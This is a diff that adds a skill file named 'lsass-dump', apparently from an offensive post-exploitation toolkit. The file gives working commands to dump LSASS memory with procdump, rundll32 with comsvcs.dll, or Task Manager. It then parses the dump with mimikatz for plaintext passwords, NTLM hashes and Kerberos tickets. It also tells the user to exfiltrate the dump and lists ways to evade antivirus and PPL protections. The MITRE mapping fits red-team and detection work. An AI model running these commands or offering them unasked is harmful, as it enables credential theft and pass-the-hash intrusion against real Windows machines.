@@ -1,0 +1,43 @@
+---
+name: lsass-dump
+phase: post
+mitre_ids: [T1003.001]
+opsec_level: 2
+description: Dump LSASS process memory to extract plaintext credentials and NTLM hashes
+module: phantom-post
+tools: [procdump, mimikatz, comsvcs.dll]
+prerequisites: [local_admin_access, windows_target]
+---
+# LSASS Memory Dump
+
+## Technique
+Dump the memory of the Local Security Authority Subsystem Service (LSASS) to
+extract cached credentials, NTLM hashes, and Kerberos tickets for offline
+cracking or pass-the-hash attacks.
+
+## Commands
+```bash
+# Method 1: procdump (signed Microsoft binary — less AV detection)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Method 2: comsvcs.dll via rundll32 (LOLBin)
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id lsass.dmp full
+
+# Method 3: Task Manager (GUI) — right-click LSASS → Create dump file
+
+# Parse dump with mimikatz (offline, on attacker machine)
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+```
+
+## Usage
+1. Obtain local administrator or SYSTEM privileges first.
+2. Dump LSASS using the least-detected method available.
+3. Exfiltrate the dump file and parse offline to avoid AV on target.
+
+## Detection Evasion
+- Use comsvcs.dll method to avoid dropping procdump binary.
+- Consider PPLdump or Mimikatz driver for PPL-protected LSASS.
+- Parse the dump on the attacker machine to avoid running mimikatz on target.
+
+## MITRE ATT&CK
+- T1003.001 — OS Credential Dumping: LSASS Memory
